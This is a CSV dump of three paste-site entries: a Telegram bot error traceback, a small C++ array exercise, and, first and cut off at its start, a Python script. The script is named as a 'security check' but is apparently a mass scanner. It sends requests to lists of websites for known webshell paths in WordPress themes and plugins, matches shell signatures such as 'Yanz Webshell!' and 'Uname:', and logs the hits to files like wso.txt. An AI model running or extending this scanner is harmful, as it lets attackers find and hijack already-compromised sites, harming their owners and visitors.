id,title,username,language,date,content
success_color = Fore.GREEN
highlight_color = Fore.MAGENTA
requests.urllib3.disable_warnings()
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M;
wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107
Mobile Safari/537.36',
    'Accept':
'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',

    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'Referer': 'www.google.com'
}
def URLdomain(url):
    if url.startswith(""http://""):
        url = url.replace(""http://"", """")
    elif url.startswith(""https://""):
        url = url.replace(""https://"", """")
    if '/' in url:
        url = url.split('/')[0]
    return url
def check_security(url):
    fg = success_color
    fr = error_color
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url +
'/wp-content/themes/travelscape/json.php', headers=headers,
allow_redirects=True, timeout=15)
        if 'MSQ_403' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('MSQ_403.txt', 'a').write(url +
'/wp-content/themes/travelscape/json.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url +
'/wp-content/themes/aahana/json.php', headers=headers,
allow_redirects=True, verify=False, timeout=15)
            if 'MSQ_403' in check.text:
                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
                open('MSQ_403.txt', 'a').write(url +
'/wp-content/themes/aahana/json.php\n')
            else:
                print(' -| ' + url + ' --> {}[Failed]'.format(fr))
        check = requests.get(url + '/wp-content/themes/travel/issue.php',
headers=headers, allow_redirects=True, timeout=15)
        if 'Yanz Webshell!' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('wso.txt', 'a').write(url +
'/wp-content/themes/travel/issue.php\n')
        else:
            url = 'https://' + URLdomain(url)
        check = requests.get(url + '/about.php', headers=headers,
allow_redirects=True, timeout=15)
        if 'Yanz Webshell!' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('wso.txt', 'a').write(url + '/about.php\n')
        else:
            url = 'https://' + URLdomain(url)
        check = requests.get(url +
'/wp-content/themes/digital-download/new.php', headers=headers,
allow_redirects=True, timeout=15)
        if '#0x2525' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('digital-download.txt', 'a').write(url +
'/wp-content/themes/digital-download/new.php\n')
        else:
            print(' -| ' + url + ' --> {}[Failed]'.format(fr))
            url = 'http://' + URLdomain(url)
        check = requests.get(url + '/epinyins.php', headers=headers,
allow_redirects=True, timeout=15)
        if 'Uname:' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('wso.txt', 'a').write(url + '/epinyins.php\n')
        else:
            print(' -| ' + url + ' --> {}[Failed]'.format(fr))
            url = 'https://' + URLdomain(url)
        check = requests.get(url + '/wp-admin/dropdown.php',
headers=headers, allow_redirects=True, verify=False, timeout=15)
        if 'Uname:' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('wso.txt', 'a').write(url + '/wp-admin/dropdown.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url +
'/wp-content/plugins/dummyyummy/wp-signup.php', headers=headers,
allow_redirects=True, verify=False, timeout=15)
            if 'Simple Shell' in check.text:
                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
                open('dummyyummy.txt', 'a').write(url +
'/wp-content/plugins/dummyyummy/wp-signup.php\n')
            else:
                print(' -| ' + url + ' --> {}[Failed]'.format(fr))
    except Exception as e:
        print(f' -| {url} --> {fr}[Failed] due to: {e}')
def main():
    try:
        url_file_path = sys.argv[1]
    except IndexError:
        url_file_path = input(f""{info_color}Enter the path to the file
containing URLs: "")
        if not os.path.isfile(url_file_path):
            print(f""{error_color}[ERROR] The specified file path is
invalid."")
            sys.exit(1)
    try:
        urls_to_check = [line.strip() for line in open(url_file_path, 'r',
encoding='utf-8').readlines()]
    except Exception as e:
        print(f""{error_color}[ERROR] An error occurred while reading the
file: {e}"")
        sys.exit(1)
    pool = ThreadPool(20)
    pool.map(check_security, urls_to_check)
    pool.close()
    pool.join()
    print(f""{info_color}Security check process completed successfully.
Results are saved in corresponding files."")
if __name__ == ""__main__"":
    main()
            "
dUf5bmCS,Untitled,renanv,Bash,Thursday 11th of April 2024 06:16:33 AM CDT,"Traceback (most recent call last):
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/dispatcher.py"", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/dispatcher.py"", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/middlewares/error.py"", line 25, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/middlewares/user_context.py"", line 27, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/fsm/middleware.py"", line 41, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/manager/manager_middleware.py"", line 77, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/event/telegram.py"", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File ""/home/videofactorybot/middlewares/db.py"", line 24, in __call__
    result = await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/event/handler.py"", line 43, in call
    return await wrapped()
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/dispatcher.py"", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 128, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/context/intent_middleware.py"", line 186, in process_callback_query
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/manager/manager_middleware.py"", line 77, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 123, in _wrapped
    return await self._propagate_event(
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 156, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 128, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 123, in _wrapped
    return await self._propagate_event(
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 156, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 128, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 123, in _wrapped
    return await self._propagate_event(
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 148, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/event/telegram.py"", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File ""/home/videofactorybot/middlewares/check_user.py"", line 34, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/manager/manager_middleware.py"", line 52, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/context/intent_middleware.py"", line 198, in context_saver_middleware
    result = await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/event/handler.py"", line 43, in call
    return await wrapped()
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/dialog.py"", line 145, in _callback_handler
    await window.process_callback(cleaned_callback, self, dialog_manager)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/window.py"", line 100, in process_callback
    await self.keyboard.process_callback(callback, dialog, manager)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/widgets/kbd/base.py"", line 79, in process_callback
    return await self._process_other_callback(callback, dialog, manager)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/widgets/kbd/group.py"", line 74, in _process_other_callback
    if await b.process_callback(callback, dialog, manager):
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/widgets/kbd/base.py"", line 73, in process_callback
    return await self._process_item_callback(
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/widgets/kbd/select.py"", line 119, in _process_item_callback
    await self.on_click.process_event(
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/widgets/widget_event.py"", line 34, in process_event
    await self.callback(event, source, manager, *args, **kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/widgets/kbd/select.py"", line 182, in _process_click
    callback, select, manager, self.type_factory(item_id),
  File ""/home/videofactorybot/dialogs/admin/access/windows.py"", line 64, in <lambda>
    type_factory=lambda x: RoleEnum[x],
  File ""/usr/lib/python3.9/enum.py"", line 408, in __getitem__
    return cls._member_map_[name]
KeyError: <RoleEnum.UNKNOWN: 'Неизвестный'>"
NDyaMdaJ,Untitled,35657,C++,Thursday 11th of April 2024 06:16:17 AM CDT,"#include <iostream>

using namespace std;

int find_min_sum_position(int* arr, const int size, int start = 0, int min_sum = INT_MAX, int min_sum_position = 0) {
	if (start > size - 10) {
		return min_sum_position;
	}
	int current_sum = 0;
	for (int i = start; i < start + 10; i++) {
		current_sum += arr[i];
	}
	if (current_sum < min_sum) {
		min_sum = current_sum;
		min_sum_position = start;
	}
	return find_min_sum_position(arr, size, start + 1, min_sum, min_sum_position);
}


int main() {
	setlocale(LC_ALL, ""ru"");

	srand(time(NULL));

	const int size = 100;
	int arr[size];

	for (int i = 0; i < size; i++) {
		arr[i] = rand() % 10;
		cout << arr[i] << "" "";
	}
	cout << endl;

	cout << find_min_sum_position(arr, size) << endl;
}
"
